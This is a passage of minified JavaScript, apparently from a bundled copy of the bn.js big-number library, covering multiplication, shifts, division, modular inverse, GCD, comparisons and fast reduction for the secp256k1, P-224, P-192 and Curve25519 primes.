              (((c + (r = (r + Math.imul(v, pt)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(v, mt)) | 0) + Math.imul(A, pt)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(A, mt)) | 0) + (o >>> 13)) | 0) +
                (Ct >>> 26)) |
              0),
              (Ct &= 67108863),
              (r = Math.imul(U, $)),
              (o = ((o = Math.imul(U, tt)) + Math.imul(q, $)) | 0),
              (i = Math.imul(q, tt)),
              (r = (r + Math.imul(L, nt)) | 0),
              (o = ((o = (o + Math.imul(L, rt)) | 0) + Math.imul(N, nt)) | 0),
              (i = (i + Math.imul(N, rt)) | 0),
              (r = (r + Math.imul(O, it)) | 0),
              (o = ((o = (o + Math.imul(O, st)) | 0) + Math.imul(R, it)) | 0),
              (i = (i + Math.imul(R, st)) | 0),
              (r = (r + Math.imul(E, ut)) | 0),
              (o = ((o = (o + Math.imul(E, ct)) | 0) + Math.imul(x, ut)) | 0),
              (i = (i + Math.imul(x, ct)) | 0),
              (r = (r + Math.imul(T, dt)) | 0),
              (o = ((o = (o + Math.imul(T, ft)) | 0) + Math.imul(B, dt)) | 0),
              (i = (i + Math.imul(B, ft)) | 0);
            var Et =
              (((c + (r = (r + Math.imul(I, pt)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(I, mt)) | 0) + Math.imul(S, pt)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(S, mt)) | 0) + (o >>> 13)) | 0) +
                (Et >>> 26)) |
              0),
              (Et &= 67108863),
              (r = Math.imul(U, nt)),
              (o = ((o = Math.imul(U, rt)) + Math.imul(q, nt)) | 0),
              (i = Math.imul(q, rt)),
              (r = (r + Math.imul(L, it)) | 0),
              (o = ((o = (o + Math.imul(L, st)) | 0) + Math.imul(N, it)) | 0),
              (i = (i + Math.imul(N, st)) | 0),
              (r = (r + Math.imul(O, ut)) | 0),
              (o = ((o = (o + Math.imul(O, ct)) | 0) + Math.imul(R, ut)) | 0),
              (i = (i + Math.imul(R, ct)) | 0),
              (r = (r + Math.imul(E, dt)) | 0),
              (o = ((o = (o + Math.imul(E, ft)) | 0) + Math.imul(x, dt)) | 0),
              (i = (i + Math.imul(x, ft)) | 0);
            var xt =
              (((c + (r = (r + Math.imul(T, pt)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(T, mt)) | 0) + Math.imul(B, pt)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(B, mt)) | 0) + (o >>> 13)) | 0) +
                (xt >>> 26)) |
              0),
              (xt &= 67108863),
              (r = Math.imul(U, it)),
              (o = ((o = Math.imul(U, st)) + Math.imul(q, it)) | 0),
              (i = Math.imul(q, st)),
              (r = (r + Math.imul(L, ut)) | 0),
              (o = ((o = (o + Math.imul(L, ct)) | 0) + Math.imul(N, ut)) | 0),
              (i = (i + Math.imul(N, ct)) | 0),
              (r = (r + Math.imul(O, dt)) | 0),
              (o = ((o = (o + Math.imul(O, ft)) | 0) + Math.imul(R, dt)) | 0),
              (i = (i + Math.imul(R, ft)) | 0);
            var Pt =
              (((c + (r = (r + Math.imul(E, pt)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(E, mt)) | 0) + Math.imul(x, pt)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(x, mt)) | 0) + (o >>> 13)) | 0) +
                (Pt >>> 26)) |
              0),
              (Pt &= 67108863),
              (r = Math.imul(U, ut)),
              (o = ((o = Math.imul(U, ct)) + Math.imul(q, ut)) | 0),
              (i = Math.imul(q, ct)),
              (r = (r + Math.imul(L, dt)) | 0),
              (o = ((o = (o + Math.imul(L, ft)) | 0) + Math.imul(N, dt)) | 0),
              (i = (i + Math.imul(N, ft)) | 0);
            var Ot =
              (((c + (r = (r + Math.imul(O, pt)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(O, mt)) | 0) + Math.imul(R, pt)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(R, mt)) | 0) + (o >>> 13)) | 0) +
                (Ot >>> 26)) |
              0),
              (Ot &= 67108863),
              (r = Math.imul(U, dt)),
              (o = ((o = Math.imul(U, ft)) + Math.imul(q, dt)) | 0),
              (i = Math.imul(q, ft));
            var Rt =
              (((c + (r = (r + Math.imul(L, pt)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(L, mt)) | 0) + Math.imul(N, pt)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(N, mt)) | 0) + (o >>> 13)) | 0) +
                (Rt >>> 26)) |
              0),
              (Rt &= 67108863);
            var Mt =
              (((c + (r = Math.imul(U, pt))) | 0) +
                ((8191 &
                  (o = ((o = Math.imul(U, mt)) + Math.imul(q, pt)) | 0)) <<
                  13)) |
              0;
            return (
              (c =
                ((((i = Math.imul(q, mt)) + (o >>> 13)) | 0) + (Mt >>> 26)) |
                0),
              (Mt &= 67108863),
              (u[0] = gt),
              (u[1] = yt),
              (u[2] = wt),
              (u[3] = bt),
              (u[4] = vt),
              (u[5] = At),
              (u[6] = kt),
              (u[7] = It),
              (u[8] = St),
              (u[9] = _t),
              (u[10] = Tt),
              (u[11] = Bt),
              (u[12] = Ct),
              (u[13] = Et),
              (u[14] = xt),
              (u[15] = Pt),
              (u[16] = Ot),
              (u[17] = Rt),
              (u[18] = Mt),
              0 !== c && ((u[19] = c), n.length++),
              n
            );
          };
          function g(t, e, n) {
            (n.negative = e.negative ^ t.negative),
              (n.length = t.length + e.length);
            for (var r = 0, o = 0, i = 0; i < n.length - 1; i++) {
              var s = o;
              o = 0;
              for (
                var a = 67108863 & r,
                  u = Math.min(i, e.length - 1),
                  c = Math.max(0, i - t.length + 1);
                c <= u;
                c++
              ) {
                var l = i - c,
                  d = (0 | t.words[l]) * (0 | e.words[c]),
                  f = 67108863 & d;
                (a = 67108863 & (f = (f + a) | 0)),
                  (o +=
                    (s =
                      ((s = (s + ((d / 67108864) | 0)) | 0) + (f >>> 26)) |
                      0) >>> 26),
                  (s &= 67108863);
              }
              (n.words[i] = a), (r = s), (s = o);
            }
            return 0 !== r ? (n.words[i] = r) : n.length--, n._strip();
          }
          function y(t, e, n) {
            return g(t, e, n);
          }
          Math.imul || (m = p),
            (o.prototype.mulTo = function (t, e) {
              var n = this.length + t.length;
              return 10 === this.length && 10 === t.length
                ? m(this, t, e)
                : n < 63
                ? p(this, t, e)
                : n < 1024
                ? g(this, t, e)
                : y(this, t, e);
            }),
            (o.prototype.mul = function (t) {
              var e = new o(null);
              return (
                (e.words = new Array(this.length + t.length)), this.mulTo(t, e)
              );
            }),
            (o.prototype.mulf = function (t) {
              var e = new o(null);
              return (
                (e.words = new Array(this.length + t.length)), y(this, t, e)
              );
            }),
            (o.prototype.imul = function (t) {
              return this.clone().mulTo(t, this);
            }),
            (o.prototype.imuln = function (t) {
              var e = t < 0;
              e && (t = -t), n("number" == typeof t), n(t < 67108864);
              for (var r = 0, o = 0; o < this.length; o++) {
                var i = (0 | this.words[o]) * t,
                  s = (67108863 & i) + (67108863 & r);
                (r >>= 26),
                  (r += (i / 67108864) | 0),
                  (r += s >>> 26),
                  (this.words[o] = 67108863 & s);
              }
              return (
                0 !== r && ((this.words[o] = r), this.length++),
                (this.length = 0 === t ? 1 : this.length),
                e ? this.ineg() : this
              );
            }),
            (o.prototype.muln = function (t) {
              return this.clone().imuln(t);
            }),
            (o.prototype.sqr = function () {
              return this.mul(this);
            }),
            (o.prototype.isqr = function () {
              return this.imul(this.clone());
            }),
            (o.prototype.pow = function (t) {
              var e = (function (t) {
                for (
                  var e = new Array(t.bitLength()), n = 0;
                  n < e.length;
                  n++
                ) {
                  var r = (n / 26) | 0,
                    o = n % 26;
                  e[n] = (t.words[r] >>> o) & 1;
                }
                return e;
              })(t);
              if (0 === e.length) return new o(1);
              for (
                var n = this, r = 0;
                r < e.length && 0 === e[r];
                r++, n = n.sqr()
              );
              if (++r < e.length)
                for (var i = n.sqr(); r < e.length; r++, i = i.sqr())
                  0 !== e[r] && (n = n.mul(i));
              return n;
            }),
            (o.prototype.iushln = function (t) {
              n("number" == typeof t && t >= 0);
              var e,
                r = t % 26,
                o = (t - r) / 26,
                i = (67108863 >>> (26 - r)) << (26 - r);
              if (0 !== r) {
                var s = 0;
                for (e = 0; e < this.length; e++) {
                  var a = this.words[e] & i,
                    u = ((0 | this.words[e]) - a) << r;
                  (this.words[e] = u | s), (s = a >>> (26 - r));
                }
                s && ((this.words[e] = s), this.length++);
              }
              if (0 !== o) {
                for (e = this.length - 1; e >= 0; e--)
                  this.words[e + o] = this.words[e];
                for (e = 0; e < o; e++) this.words[e] = 0;
                this.length += o;
              }
              return this._strip();
            }),
            (o.prototype.ishln = function (t) {
              return n(0 === this.negative), this.iushln(t);
            }),
            (o.prototype.iushrn = function (t, e, r) {
              var o;
              n("number" == typeof t && t >= 0),
                (o = e ? (e - (e % 26)) / 26 : 0);
              var i = t % 26,
                s = Math.min((t - i) / 26, this.length),
                a = 67108863 ^ ((67108863 >>> i) << i),
                u = r;
              if (((o -= s), (o = Math.max(0, o)), u)) {
                for (var c = 0; c < s; c++) u.words[c] = this.words[c];
                u.length = s;
              }
              if (0 === s);
              else if (this.length > s)
                for (this.length -= s, c = 0; c < this.length; c++)
                  this.words[c] = this.words[c + s];
              else (this.words[0] = 0), (this.length = 1);
              var l = 0;
              for (c = this.length - 1; c >= 0 && (0 !== l || c >= o); c--) {
                var d = 0 | this.words[c];
                (this.words[c] = (l << (26 - i)) | (d >>> i)), (l = d & a);
              }
              return (
                u && 0 !== l && (u.words[u.length++] = l),
                0 === this.length && ((this.words[0] = 0), (this.length = 1)),
                this._strip()
              );
            }),
            (o.prototype.ishrn = function (t, e, r) {
              return n(0 === this.negative), this.iushrn(t, e, r);
            }),
            (o.prototype.shln = function (t) {
              return this.clone().ishln(t);
            }),
            (o.prototype.ushln = function (t) {
              return this.clone().iushln(t);
            }),
            (o.prototype.shrn = function (t) {
              return this.clone().ishrn(t);
            }),
            (o.prototype.ushrn = function (t) {
              return this.clone().iushrn(t);
            }),
            (o.prototype.testn = function (t) {
              n("number" == typeof t && t >= 0);
              var e = t % 26,
                r = (t - e) / 26,
                o = 1 << e;
              return !(this.length <= r || !(this.words[r] & o));
            }),
            (o.prototype.imaskn = function (t) {
              n("number" == typeof t && t >= 0);
              var e = t % 26,
                r = (t - e) / 26;
              if (
                (n(
                  0 === this.negative,
                  "imaskn works only with positive numbers"
                ),
                this.length <= r)
              )
                return this;
              if (
                (0 !== e && r++,
                (this.length = Math.min(r, this.length)),
                0 !== e)
              ) {
                var o = 67108863 ^ ((67108863 >>> e) << e);
                this.words[this.length - 1] &= o;
              }
              return this._strip();
            }),
            (o.prototype.maskn = function (t) {
              return this.clone().imaskn(t);
            }),
            (o.prototype.iaddn = function (t) {
              return (
                n("number" == typeof t),
                n(t < 67108864),
                t < 0
                  ? this.isubn(-t)
                  : 0 !== this.negative
                  ? 1 === this.length && (0 | this.words[0]) <= t
                    ? ((this.words[0] = t - (0 | this.words[0])),
                      (this.negative = 0),
                      this)
                    : ((this.negative = 0),
                      this.isubn(t),
                      (this.negative = 1),
                      this)
                  : this._iaddn(t)
              );
            }),
            (o.prototype._iaddn = function (t) {
              this.words[0] += t;
              for (var e = 0; e < this.length && this.words[e] >= 67108864; e++)
                (this.words[e] -= 67108864),
                  e === this.length - 1
                    ? (this.words[e + 1] = 1)
                    : this.words[e + 1]++;
              return (this.length = Math.max(this.length, e + 1)), this;
            }),
            (o.prototype.isubn = function (t) {
              if ((n("number" == typeof t), n(t < 67108864), t < 0))
                return this.iaddn(-t);
              if (0 !== this.negative)
                return (
                  (this.negative = 0), this.iaddn(t), (this.negative = 1), this
                );
              if (
                ((this.words[0] -= t), 1 === this.length && this.words[0] < 0)
              )
                (this.words[0] = -this.words[0]), (this.negative = 1);
              else
                for (var e = 0; e < this.length && this.words[e] < 0; e++)
                  (this.words[e] += 67108864), (this.words[e + 1] -= 1);
              return this._strip();
            }),
            (o.prototype.addn = function (t) {
              return this.clone().iaddn(t);
            }),
            (o.prototype.subn = function (t) {
              return this.clone().isubn(t);
            }),
            (o.prototype.iabs = function () {
              return (this.negative = 0), this;
            }),
            (o.prototype.abs = function () {
              return this.clone().iabs();
            }),
            (o.prototype._ishlnsubmul = function (t, e, r) {
              var o,
                i,
                s = t.length + r;
              this._expand(s);
              var a = 0;
              for (o = 0; o < t.length; o++) {
                i = (0 | this.words[o + r]) + a;
                var u = (0 | t.words[o]) * e;
                (a = ((i -= 67108863 & u) >> 26) - ((u / 67108864) | 0)),
                  (this.words[o + r] = 67108863 & i);
              }
              for (; o < this.length - r; o++)
                (a = (i = (0 | this.words[o + r]) + a) >> 26),
                  (this.words[o + r] = 67108863 & i);
              if (0 === a) return this._strip();
              for (n(-1 === a), a = 0, o = 0; o < this.length; o++)
                (a = (i = -(0 | this.words[o]) + a) >> 26),
                  (this.words[o] = 67108863 & i);
              return (this.negative = 1), this._strip();
            }),
            (o.prototype._wordDiv = function (t, e) {
              var n = (this.length, t.length),
                r = this.clone(),
                i = t,
                s = 0 | i.words[i.length - 1];
              0 != (n = 26 - this._countBits(s)) &&
                ((i = i.ushln(n)),
                r.iushln(n),
                (s = 0 | i.words[i.length - 1]));
              var a,
                u = r.length - i.length;
              if ("mod" !== e) {
                ((a = new o(null)).length = u + 1),
                  (a.words = new Array(a.length));
                for (var c = 0; c < a.length; c++) a.words[c] = 0;
              }
              var l = r.clone()._ishlnsubmul(i, 1, u);
              0 === l.negative && ((r = l), a && (a.words[u] = 1));
              for (var d = u - 1; d >= 0; d--) {
                var f =
                  67108864 * (0 | r.words[i.length + d]) +
                  (0 | r.words[i.length + d - 1]);
                for (
                  f = Math.min((f / s) | 0, 67108863), r._ishlnsubmul(i, f, d);
                  0 !== r.negative;

                )
                  f--,
                    (r.negative = 0),
                    r._ishlnsubmul(i, 1, d),
                    r.isZero() || (r.negative ^= 1);
                a && (a.words[d] = f);
              }
              return (
                a && a._strip(),
                r._strip(),
                "div" !== e && 0 !== n && r.iushrn(n),
                { div: a || null, mod: r }
              );
            }),
            (o.prototype.divmod = function (t, e, r) {
              return (
                n(!t.isZero()),
                this.isZero()
                  ? { div: new o(0), mod: new o(0) }
                  : 0 !== this.negative && 0 === t.negative
                  ? ((a = this.neg().divmod(t, e)),
                    "mod" !== e && (i = a.div.neg()),
                    "div" !== e &&
                      ((s = a.mod.neg()), r && 0 !== s.negative && s.iadd(t)),
                    { div: i, mod: s })
                  : 0 === this.negative && 0 !== t.negative
                  ? ((a = this.divmod(t.neg(), e)),
                    "mod" !== e && (i = a.div.neg()),
                    { div: i, mod: a.mod })
                  : 0 !== (this.negative & t.negative)
                  ? ((a = this.neg().divmod(t.neg(), e)),
                    "div" !== e &&
                      ((s = a.mod.neg()), r && 0 !== s.negative && s.isub(t)),
                    { div: a.div, mod: s })
                  : t.length > this.length || this.cmp(t) < 0
                  ? { div: new o(0), mod: this }
                  : 1 === t.length
                  ? "div" === e
                    ? { div: this.divn(t.words[0]), mod: null }
                    : "mod" === e
                    ? { div: null, mod: new o(this.modrn(t.words[0])) }
                    : {
                        div: this.divn(t.words[0]),
                        mod: new o(this.modrn(t.words[0])),
                      }
                  : this._wordDiv(t, e)
              );
              var i, s, a;
            }),
            (o.prototype.div = function (t) {
              return this.divmod(t, "div", !1).div;
            }),
            (o.prototype.mod = function (t) {
              return this.divmod(t, "mod", !1).mod;
            }),
            (o.prototype.umod = function (t) {
              return this.divmod(t, "mod", !0).mod;
            }),
            (o.prototype.divRound = function (t) {
              var e = this.divmod(t);
              if (e.mod.isZero()) return e.div;
              var n = 0 !== e.div.negative ? e.mod.isub(t) : e.mod,
                r = t.ushrn(1),
                o = t.andln(1),
                i = n.cmp(r);
              return i < 0 || (1 === o && 0 === i)
                ? e.div
                : 0 !== e.div.negative
                ? e.div.isubn(1)
                : e.div.iaddn(1);
            }),
            (o.prototype.modrn = function (t) {
              var e = t < 0;
              e && (t = -t), n(t <= 67108863);
              for (
                var r = (1 << 26) % t, o = 0, i = this.length - 1;
                i >= 0;
                i--
              )
                o = (r * o + (0 | this.words[i])) % t;
              return e ? -o : o;
            }),
            (o.prototype.modn = function (t) {
              return this.modrn(t);
            }),
            (o.prototype.idivn = function (t) {
              var e = t < 0;
              e && (t = -t), n(t <= 67108863);
              for (var r = 0, o = this.length - 1; o >= 0; o--) {
                var i = (0 | this.words[o]) + 67108864 * r;
                (this.words[o] = (i / t) | 0), (r = i % t);
              }
              return this._strip(), e ? this.ineg() : this;
            }),
            (o.prototype.divn = function (t) {
              return this.clone().idivn(t);
            }),
            (o.prototype.egcd = function (t) {
              n(0 === t.negative), n(!t.isZero());
              var e = this,
                r = t.clone();
              e = 0 !== e.negative ? e.umod(t) : e.clone();
              for (
                var i = new o(1),
                  s = new o(0),
                  a = new o(0),
                  u = new o(1),
                  c = 0;
                e.isEven() && r.isEven();

              )
                e.iushrn(1), r.iushrn(1), ++c;
              for (var l = r.clone(), d = e.clone(); !e.isZero(); ) {
                for (
                  var f = 0, h = 1;
                  0 === (e.words[0] & h) && f < 26;
                  ++f, h <<= 1
                );
                if (f > 0)
                  for (e.iushrn(f); f-- > 0; )
                    (i.isOdd() || s.isOdd()) && (i.iadd(l), s.isub(d)),
                      i.iushrn(1),
                      s.iushrn(1);
                for (
                  var p = 0, m = 1;
                  0 === (r.words[0] & m) && p < 26;
                  ++p, m <<= 1
                );
                if (p > 0)
                  for (r.iushrn(p); p-- > 0; )
                    (a.isOdd() || u.isOdd()) && (a.iadd(l), u.isub(d)),
                      a.iushrn(1),
                      u.iushrn(1);
                e.cmp(r) >= 0
                  ? (e.isub(r), i.isub(a), s.isub(u))
                  : (r.isub(e), a.isub(i), u.isub(s));
              }
              return { a: a, b: u, gcd: r.iushln(c) };
            }),
            (o.prototype._invmp = function (t) {
              n(0 === t.negative), n(!t.isZero());
              var e = this,
                r = t.clone();
              e = 0 !== e.negative ? e.umod(t) : e.clone();
              for (
                var i, s = new o(1), a = new o(0), u = r.clone();
                e.cmpn(1) > 0 && r.cmpn(1) > 0;

              ) {
                for (
                  var c = 0, l = 1;
                  0 === (e.words[0] & l) && c < 26;
                  ++c, l <<= 1
                );
                if (c > 0)
                  for (e.iushrn(c); c-- > 0; )
                    s.isOdd() && s.iadd(u), s.iushrn(1);
                for (
                  var d = 0, f = 1;
                  0 === (r.words[0] & f) && d < 26;
                  ++d, f <<= 1
                );
                if (d > 0)
                  for (r.iushrn(d); d-- > 0; )
                    a.isOdd() && a.iadd(u), a.iushrn(1);
                e.cmp(r) >= 0 ? (e.isub(r), s.isub(a)) : (r.isub(e), a.isub(s));
              }
              return (i = 0 === e.cmpn(1) ? s : a).cmpn(0) < 0 && i.iadd(t), i;
            }),
            (o.prototype.gcd = function (t) {
              if (this.isZero()) return t.abs();
              if (t.isZero()) return this.abs();
              var e = this.clone(),
                n = t.clone();
              (e.negative = 0), (n.negative = 0);
              for (var r = 0; e.isEven() && n.isEven(); r++)
                e.iushrn(1), n.iushrn(1);
              for (;;) {
                for (; e.isEven(); ) e.iushrn(1);
                for (; n.isEven(); ) n.iushrn(1);
                var o = e.cmp(n);
                if (o < 0) {
                  var i = e;
                  (e = n), (n = i);
                } else if (0 === o || 0 === n.cmpn(1)) break;
                e.isub(n);
              }
              return n.iushln(r);
            }),
            (o.prototype.invm = function (t) {
              return this.egcd(t).a.umod(t);
            }),
            (o.prototype.isEven = function () {
              return !(1 & this.words[0]);
            }),
            (o.prototype.isOdd = function () {
              return !(1 & ~this.words[0]);
            }),
            (o.prototype.andln = function (t) {
              return this.words[0] & t;
            }),
            (o.prototype.bincn = function (t) {
              n("number" == typeof t);
              var e = t % 26,
                r = (t - e) / 26,
                o = 1 << e;
              if (this.length <= r)
                return this._expand(r + 1), (this.words[r] |= o), this;
              for (var i = o, s = r; 0 !== i && s < this.length; s++) {
                var a = 0 | this.words[s];
                (i = (a += i) >>> 26), (a &= 67108863), (this.words[s] = a);
              }
              return 0 !== i && ((this.words[s] = i), this.length++), this;
            }),
            (o.prototype.isZero = function () {
              return 1 === this.length && 0 === this.words[0];
            }),
            (o.prototype.cmpn = function (t) {
              var e,
                r = t < 0;
              if (0 !== this.negative && !r) return -1;
              if (0 === this.negative && r) return 1;
              if ((this._strip(), this.length > 1)) e = 1;
              else {
                r && (t = -t), n(t <= 67108863, "Number is too big");
                var o = 0 | this.words[0];
                e = o === t ? 0 : o < t ? -1 : 1;
              }
              return 0 !== this.negative ? 0 | -e : e;
            }),
            (o.prototype.cmp = function (t) {
              if (0 !== this.negative && 0 === t.negative) return -1;
              if (0 === this.negative && 0 !== t.negative) return 1;
              var e = this.ucmp(t);
              return 0 !== this.negative ? 0 | -e : e;
            }),
            (o.prototype.ucmp = function (t) {
              if (this.length > t.length) return 1;
              if (this.length < t.length) return -1;
              for (var e = 0, n = this.length - 1; n >= 0; n--) {
                var r = 0 | this.words[n],
                  o = 0 | t.words[n];
                if (r !== o) {
                  r < o ? (e = -1) : r > o && (e = 1);
                  break;
                }
              }
              return e;
            }),
            (o.prototype.gtn = function (t) {
              return 1 === this.cmpn(t);
            }),
            (o.prototype.gt = function (t) {
              return 1 === this.cmp(t);
            }),
            (o.prototype.gten = function (t) {
              return this.cmpn(t) >= 0;
            }),
            (o.prototype.gte = function (t) {
              return this.cmp(t) >= 0;
            }),
            (o.prototype.ltn = function (t) {
              return -1 === this.cmpn(t);
            }),
            (o.prototype.lt = function (t) {
              return -1 === this.cmp(t);
            }),
            (o.prototype.lten = function (t) {
              return this.cmpn(t) <= 0;
            }),
            (o.prototype.lte = function (t) {
              return this.cmp(t) <= 0;
            }),
            (o.prototype.eqn = function (t) {
              return 0 === this.cmpn(t);
            }),
            (o.prototype.eq = function (t) {
              return 0 === this.cmp(t);
            }),
            (o.red = function (t) {
              return new S(t);
            }),
            (o.prototype.toRed = function (t) {
              return (
                n(!this.red, "Already a number in reduction context"),
                n(0 === this.negative, "red works only with positives"),
                t.convertTo(this)._forceRed(t)
              );
            }),
            (o.prototype.fromRed = function () {
              return (
                n(
                  this.red,
                  "fromRed works only with numbers in reduction context"
                ),
                this.red.convertFrom(this)
              );
            }),
            (o.prototype._forceRed = function (t) {
              return (this.red = t), this;
            }),
            (o.prototype.forceRed = function (t) {
              return (
                n(!this.red, "Already a number in reduction context"),
                this._forceRed(t)
              );
            }),
            (o.prototype.redAdd = function (t) {
              return (
                n(this.red, "redAdd works only with red numbers"),
                this.red.add(this, t)
              );
            }),
            (o.prototype.redIAdd = function (t) {
              return (
                n(this.red, "redIAdd works only with red numbers"),
                this.red.iadd(this, t)
              );
            }),
            (o.prototype.redSub = function (t) {
              return (
                n(this.red, "redSub works only with red numbers"),
                this.red.sub(this, t)
              );
            }),
            (o.prototype.redISub = function (t) {
              return (
                n(this.red, "redISub works only with red numbers"),
                this.red.isub(this, t)
              );
            }),
            (o.prototype.redShl = function (t) {
              return (
                n(this.red, "redShl works only with red numbers"),
                this.red.shl(this, t)
              );
            }),
            (o.prototype.redMul = function (t) {
              return (
                n(this.red, "redMul works only with red numbers"),
                this.red._verify2(this, t),
                this.red.mul(this, t)
              );
            }),
            (o.prototype.redIMul = function (t) {
              return (
                n(this.red, "redMul works only with red numbers"),
                this.red._verify2(this, t),
                this.red.imul(this, t)
              );
            }),
            (o.prototype.redSqr = function () {
              return (
                n(this.red, "redSqr works only with red numbers"),
                this.red._verify1(this),
                this.red.sqr(this)
              );
            }),
            (o.prototype.redISqr = function () {
              return (
                n(this.red, "redISqr works only with red numbers"),
                this.red._verify1(this),
                this.red.isqr(this)
              );
            }),
            (o.prototype.redSqrt = function () {
              return (
                n(this.red, "redSqrt works only with red numbers"),
                this.red._verify1(this),
                this.red.sqrt(this)
              );
            }),
            (o.prototype.redInvm = function () {
              return (
                n(this.red, "redInvm works only with red numbers"),
                this.red._verify1(this),
                this.red.invm(this)
              );
            }),
            (o.prototype.redNeg = function () {
              return (
                n(this.red, "redNeg works only with red numbers"),
                this.red._verify1(this),
                this.red.neg(this)
              );
            }),
            (o.prototype.redPow = function (t) {
              return (
                n(this.red && !t.red, "redPow(normalNum)"),
                this.red._verify1(this),
                this.red.pow(this, t)
              );
            });
          var w = { k256: null, p224: null, p192: null, p25519: null };
          function b(t, e) {
            (this.name = t),
              (this.p = new o(e, 16)),
              (this.n = this.p.bitLength()),
              (this.k = new o(1).iushln(this.n).isub(this.p)),
              (this.tmp = this._tmp());
          }
          function v() {
            b.call(
              this,
              "k256",
              "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f"
            );
          }
          function A() {
            b.call(
              this,
              "p224",
              "ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001"
            );
          }
          function k() {
            b.call(
              this,
              "p192",
              "ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff"
            );
          }
          function I() {
            b.call(
              this,
              "25519",
              "7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed"
            );
          }
          function S(t) {
            if ("string" == typeof t) {
              var e = o._prime(t);
              (this.m = e.p), (this.prime = e);
            } else
              n(t.gtn(1), "modulus must be greater than 1"),
                (this.m = t),
                (this.prime = null);
          }
          function _(t) {
            S.call(this, t),
              (this.shift = this.m.bitLength()),
              this.shift % 26 != 0 && (this.shift += 26 - (this.shift % 26)),
              (this.r = new o(1).iushln(this.shift)),
              (this.r2 = this.imod(this.r.sqr())),
              (this.rinv = this.r._invmp(this.m)),
              (this.minv = this.rinv.mul(this.r).isubn(1).div(this.m)),
              (this.minv = this.minv.umod(this.r)),
              (this.minv = this.r.sub(this.minv));
          }
          (b.prototype._tmp = function () {
            var t = new o(null);
            return (t.words = new Array(Math.ceil(this.n / 13))), t;
          }),
            (b.prototype.ireduce = function (t) {
              var e,
                n = t;
              do {
                this.split(n, this.tmp),
                  (e = (n = (n = this.imulK(n)).iadd(this.tmp)).bitLength());
              } while (e > this.n);
              var r = e < this.n ? -1 : n.ucmp(this.p);
              return (
                0 === r
                  ? ((n.words[0] = 0), (n.length = 1))
                  : r > 0
                  ? n.isub(this.p)
                  : void 0 !== n.strip
                  ? n.strip()
                  : n._strip(),
                n
              );
            }),
            (b.prototype.split = function (t, e) {
              t.iushrn(this.n, 0, e);
            }),
            (b.prototype.imulK = function (t) {
              return t.imul(this.k);
            }),
            r(v, b),
            (v.prototype.split = function (t, e) {
              for (
                var n = 4194303, r = Math.min(t.length, 9), o = 0;
                o < r;
                o++
              )
                e.words[o] = t.words[o];
              if (((e.length = r), t.length <= 9))
                return (t.words[0] = 0), (t.length = 1), void 0;
              var i = t.words[9];
              for (e.words[e.length++] = i & n, o = 10; o < t.length; o++) {
                var s = 0 | t.words[o];
                (t.words[o - 10] = ((s & n) << 4) | (i >>> 22)), (i = s);
              }
              (i >>>= 22),
                (t.words[o - 10] = i),
                0 === i && t.length > 10 ? (t.length -= 10) : (t.length -= 9);
            }),
            (v.prototype.imulK = function (t) {
              (t.words[t.length] = 0),
                (t.words[t.length + 1] = 0),
                (t.length += 2);
              for (var e = 0, n = 0; n < t.length; n++) {
                var r = 0 | t.words[n];
                (e += 977 * r),
                  (t.words[n] = 67108863 & e),
                  (e = 64 * r + ((e / 67108864) | 0));
              }
              return (
                0 === t.words[t.length - 1] &&
                  (t.length--, 0 === t.words[t.length - 1] && t.length--),
                t
              );
            }),
            r(A, b),
            r(k, b),
            r(I, b),
            (I.prototype.imulK = function (t) {
              for (var e = 0, n = 0; n < t.length; n++) {
                var r = 19 * (0 | t.words[n]) + e,
                  o = 67108863 & r;
                (r >>>= 26), (t.words[n] = o), (e = r);
              }
              return 0 !== e && (t.words[t.length++] = e), t;
            }),
            (o._prime = function (t) {
              if (w[t]) return w[t];
              var e;
              if ("k256" === t) e = new v();
              else if ("p224" === t) e = new A();
              else if ("p192" === t) e = new k();
              else {
                if ("p25519" !== t) throw new Error("Unknown prime " + t);
                e = new I();
              }
              return (w[t] = e), e;
            }),
            (S.prototype._verify1 = function (t) {
              n(0 === t.negative, "red works only with positives"),
                n(t.red, "red works only with red numbers");
            }),
            (S.prototype._verify2 = function (t, e) {
              n(
                0 === (t.negative | e.negative),
                "red works only with positives"
              ),
                n(t.red && t.red === e.red, "red works only with red numbers");
            }),
            (S.prototype.imod = function (t) {
              return this.prime
                ? this.prime.ireduce(t)._forceRed(this)
                : (c(t, t.umod(this.m)._forceRed(this)), t);
            }),
            (S.prototype.neg = function (t) {
              return t.isZero() ? t.clone() : this.m.sub(t)._forceRed(this);
            }),
            (S.prototype.add = function (t, e) {
              this._verify2(t, e);
              var n = t.add(e);
              return n.cmp(this.m) >= 0 && n.isub(this.m), n._forceRed(this);
            }),
            (S.prototype.iadd = function (t, e) {
              this._verify2(t, e);
              var n = t.iadd(e);
              return n.cmp(this.m) >= 0 && n.isub(this.m), n;
            }),
            (S.prototype.sub = function (t, e) {
              this._verify2(t, e);
              var n = t.sub(e);
              return n.cmpn(0) < 0 && n.iadd(this.m), n._forceRed(this);
            }),
            (S.prototype.isub = function (t, e) {
              this._verify2(t, e);
              var n = t.isub(e);
              return n.cmpn(0) < 0 && n.iadd(this.m), n;
            }),
            (S.prototype.shl = function (t, e) {
              return this._verify1(t), this.imod(t.ushln(e));
            }),
            (S.prototype.imul = function (t, e) {
              return this._verify2(t, e), this.imod(t.imul(e));
            }),
            (S.prototype.mul = function (t, e) {
              return this._verify2(t, e), this.imod(t.mul(e));
            }),
            (S.prototype.isqr = function (t) {
              return this.imul(t, t.clone());
            }),
